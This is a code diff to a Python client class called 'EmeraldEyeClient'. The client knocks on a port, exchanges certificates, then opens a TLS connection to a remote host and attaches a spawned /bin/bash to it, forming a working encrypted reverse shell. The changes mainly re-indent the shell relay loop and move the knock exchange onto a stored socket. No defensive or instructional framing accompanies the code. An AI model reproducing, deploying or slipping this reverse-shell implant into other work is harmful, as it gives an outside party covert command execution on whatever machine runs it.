@@ -43,71 +43,69 @@ class EmeraldEyeClient():
         return ret
 
     def interact(self):
-        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
-            context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=self.tls_other_crt_file)
-            context.verify_mode = ssl.CERT_REQUIRED
-            context.load_cert_chain(certfile=self.tls_cert_file, keyfile=self.tls_private_key_file)
-            ss = context.wrap_socket(self.sock, server_side=False, server_hostname=self.server_hostname)
-            ss.connect((self.host, TLS_PORT))
-            stdin_control, stdin = pty.openpty()
-            stdout_control, stdout = pty.openpty()
-            stderr_control, stderr = pty.openpty()
-            bash = subprocess.Popen("/bin/bash",
-                                    preexec_fn=os.setsid,
-                                    stdin=stdin,
-                                    stdout=stdout,
-                                    stderr=stderr,
-                                    universal_newlines=True)
-            time.sleep(0.5)  
-            while bash.poll() is None:
-                buffer, _, _ = select.select([ss, stdin_control, stdout_control, stderr_control], [], [])
-                # Need to clean this up, but having issues with io mashing together and sending in one packet
-                if stdin_control in buffer:
-                    print("A")
-                    io_read = os.read(stdin_control, 2048)
-                    if io_read:
-                        io_read += b'-emrdeye'
-                        print("Data Sent: " + io_read.decode())
-                        ss.write(io_read)
-                elif stdout_control in buffer:
-                    print("B")
-                    io_read = os.read(stdout_control, 2048)
-                    if io_read:
-                        io_read += b'-emrdeye'
-                        print("Data Sent: " + io_read.decode())
-                        ss.write(io_read)
-                elif stderr_control in buffer:
-                    print("C")
-                    io_read = os.read(stderr_control, 2048)
-                    if io_read:
-                        io_read += b'-emrdeye'
-                        print("Data Sent: " + io_read.decode())
-                        ss.write(io_read)
-                elif ss in buffer:
-                    print("D")
-                    try:
-                        packet = ss.recv(1024)
-                        print("packet Received: " + packet.decode())
-                    except ssl.SSLError as e:
-                        if e.errno == ssl.SSL_ERROR_WANT_READ:
-                            continue
-                        raise
-                    if not packet:
-                        break
+        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=self.tls_other_crt_file)
+        context.verify_mode = ssl.CERT_REQUIRED
+        context.load_cert_chain(certfile=self.tls_cert_file, keyfile=self.tls_private_key_file)
+        ss = context.wrap_socket(self.sock, server_side=False, server_hostname=self.server_hostname)
+        ss.connect((self.host, TLS_PORT))
+        stdin_control, stdin = pty.openpty()
+        stdout_control, stdout = pty.openpty()
+        stderr_control, stderr = pty.openpty()
+        bash = subprocess.Popen("/bin/bash",
+                                preexec_fn=os.setsid,
+                                stdin=stdin,
+                                stdout=stdout,
+                                stderr=stderr,
+                                universal_newlines=True)
+        time.sleep(0.5)  
+        while bash.poll() is None:
+            buffer, _, _ = select.select([ss, stdin_control, stdout_control, stderr_control], [], [])
+            # Need to clean this up, but having issues with io mashing together and sending in one packet
+            if stdin_control in buffer:
+                print("A")
+                io_read = os.read(stdin_control, 2048)
+                if io_read:
+                    io_read += b'-emrdeye'
+                    print("Data Sent: " + io_read.decode())
+                    ss.write(io_read)
+            elif stdout_control in buffer:
+                print("B")
+                io_read = os.read(stdout_control, 2048)
+                if io_read:
+                    io_read += b'-emrdeye'
+                    print("Data Sent: " + io_read.decode())
+                    ss.write(io_read)
+            elif stderr_control in buffer:
+                print("C")
+                io_read = os.read(stderr_control, 2048)
+                if io_read:
+                    io_read += b'-emrdeye'
+                    print("Data Sent: " + io_read.decode())
+                    ss.write(io_read)
+            elif ss in buffer:
+                print("D")
+                try:
+                    packet = ss.recv(1024)
+                    print("packet Received: " + packet.decode())
+                except ssl.SSLError as e:
+                    if e.errno == ssl.SSL_ERROR_WANT_READ:
+                        continue
+                    raise
+                if not packet:
+                    break
+                packet_left = ss.pending()
+                while packet_left:
+                    packet += ss.recv(packet_left)
                     packet_left = ss.pending()
-                    while packet_left:
-                        packet += ss.recv(packet_left)
-                        packet_left = ss.pending()
-                    os.write(stdin_control, packet)
+                os.write(stdin_control, packet)
                 
     def health_check(self):
         print("Trying to connect...")
-        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
         try:
-            s.connect((self.host, KNOCK_PORT))
+            self.knock_sock.connect((self.host, KNOCK_PORT))
             print("Connected to :" + self.host)
-            s.sendall(b'Knock')
-            packet = s.recv(1024)
+            self.knock_sock.sendall(b'Knock')
+            packet = self.knock_sock.recv(1024)
             if packet == b'Knock':
                 print("packet Received: " + packet.decode())
                 pass
@@ -117,12 +115,12 @@ class EmeraldEyeClient():
                 time.sleep(0.25) 
                 crt = b'crt-'+self.crt
                 print("Sending cert to server...")
-                s.sendall(crt)
+                self.knock_sock.sendall(crt)
                 resv = b''
                 while resv == b'':
                     try:
-                        s.settimeout(5)
-                        resv = s.recv(1024)
+                        self.knock_sock.settimeout(5)
+                        resv = self.knock_sock.recv(1024)
                     except Exception as e:
                         print("Didn't get go signal, retrying")
                 with open(self.tls_other_crt_file, "wt") as f:
